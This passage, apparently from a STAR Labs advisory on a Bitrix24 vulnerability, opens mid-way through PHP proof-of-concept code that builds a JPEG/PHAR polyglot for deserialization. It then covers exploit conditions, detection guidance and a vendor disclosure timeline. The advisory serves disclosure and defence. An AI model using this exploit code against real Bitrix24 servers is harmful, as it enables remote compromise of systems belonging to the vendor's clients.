</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$len</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$phar</span><span class="p">)</span> <span class="o">+</span> <span class="mi">2</span><span class="p">;</span> <span class="c1">// fixed
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$new</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$jpeg</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\xff\xfe</span><span class="s2">&#34;</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$len</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$len</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$phar</span> <span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$jpeg</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$contents</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$new</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">148</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&#34;        &#34;</span> <span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$new</span><span class="p">,</span> <span class="mi">156</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1">// calc tar checksum
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$chksum</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="mi">512</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$chksum</span> <span class="o">+=</span> <span class="nx">ord</span><span class="p">(</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$contents</span><span class="p">,</span> <span class="nv">$i</span><span class="p">,</span> <span class="mi">1</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// embed checksum
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nv">$oct</span> <span class="o">=</span> <span class="nx">sprintf</span><span class="p">(</span><span class="s2">&#34;%07o&#34;</span><span class="p">,</span> <span class="nv">$chksum</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$contents</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$contents</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">148</span><span class="p">)</span> <span class="o">.</span> <span class="nv">$oct</span> <span class="o">.</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$contents</span><span class="p">,</span> <span class="mi">155</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$contents</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// config for jpg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$tempname</span> <span class="o">=</span> <span class="s1">&#39;temp.tar.phar&#39;</span><span class="p">;</span> <span class="c1">// make it tar
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$jpeg</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;bitrix.jpg&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$outfile</span> <span class="o">=</span> <span class="s1">&#39;test.phar&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$payload</span> <span class="o">=</span> <span class="nv">$cloudDebug</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// make jpg
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$outfile</span><span class="p">,</span> <span class="nx">generate_polyglot</span><span class="p">(</span><span class="nx">generate_base_phar</span><span class="p">(</span><span class="nv">$payload</span><span class="p">),</span> <span class="nv">$jpeg</span><span class="p">));</span>
</span></span></code></pre></div><p><code>CCloudsDebug.php</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">CCloudsDebug</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$head</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	<span class="k">public</span> <span class="nv">$id</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Additionally, the following <code>bitrix.jpg</code> file also needs to be present:
<img loading="lazy" src="https://i.pcmag.com/imagery/reviews/01NgAESofvO14fIrszveAXv-8.fit_scale.size_1028x578.v1569475937.jpg" alt="bitrix.jpg"  />
</p>
<h3 id="exploit-conditions-1">Exploit Conditions:<a hidden class="anchor" aria-hidden="true" href="#exploit-conditions-1">#</a></h3>
<p>This vulnerability can be exploited when the attacker has access to the CRM feature and permission to edit contacts. This level of access may be granted if the user is in the management board group.</p>
<h3 id="detection-guidance-1">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance-1">#</a></h3>
<p>It is possible to detect the exploitation of this vulnerability by scanning the file system to detect the presence of <code>phar</code> files, which contain the string <code>__HALT_COMPILER();</code>. Alternatively, the traffic logs can be examined to check if any of the <code>BITRIX_SM_LAST_SETTINGS</code> cookies sent to the server contain the string <code>phar://</code>.</p>
<h2 id="credits">Credits<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
<p>Lam Jun Rong &amp; Li Jiantao of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
<h2 id="timeline">Timeline<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
<ul>
<li>2023-03-17 Initial Vendor Contact via <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a></li>
<li>2023-03-18 No reply from vendor, tried using the form again</li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#741d1a121b34161d00061d0c5a171b19"><span class="__cf_email__" data-cfemail="2f464149406f4d465b5d4657014c4042">[email&#160;protected]</span></a></li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#4a23242c250a7b296728233e38233264383f"><span class="__cf_email__" data-cfemail="a6cfc8c0c9e697c58bc4cfd2d4cfde88d4d3">[email&#160;protected]</span></a></li>
<li>2023-03-24 Got reply from <a href="/cdn-cgi/l/email-protection#5d34333b321d6c3e703f34292f3425732f28"><span class="__cf_email__" data-cfemail="83eaede5ecc3b2e0aee1eaf7f1eafbadf1f6">[email&#160;protected]</span></a>, they asked us to email to <a href="/cdn-cgi/l/email-protection#cca5a2aaa38caea5b8bea5b4e2afa3a1"><span class="__cf_email__" data-cfemail="234a4d454c63414a57514a5b0d404c4e">[email&#160;protected]</span></a> or use the form at <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a> with regards to the bug reports</li>
<li>2023-03-29 Emailed to [redacted], [redacted] &amp; [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform]</li>
<li>2023-03-30 [redacted] replied to us</li>
<li>2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform]</li>
<li>2023-03-31 Emailed back to [redacted] that we are unable to do so because it&rsquo;s a private program in that [USA bug bounty platform]</li>
<li>2023-03-31 [redacted] emailed back with the invite</li>
<li>2023-03-31 Submitted the reports via that [USA bug bounty platform]</li>
<li>2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements]</li>
<li>2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us</li>
<li>2023-04-04 We submitted the final 2 reports</li>
<li>2023-06-21 [redacted] emailed us &ldquo;Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.&rdquo;</li>
<li>2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date.</li>
<li>2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023</li>
<li>2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023</li>
<li>2023-09-22 [redacted] accepted the date</li>
<li>2023-11-01 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-1713/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-1713) Bitrix24 Remote Command Execution (RCE) via Insecure Temporary File Creation</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-1715/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-1715 &amp; CVE-2023-1716) Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
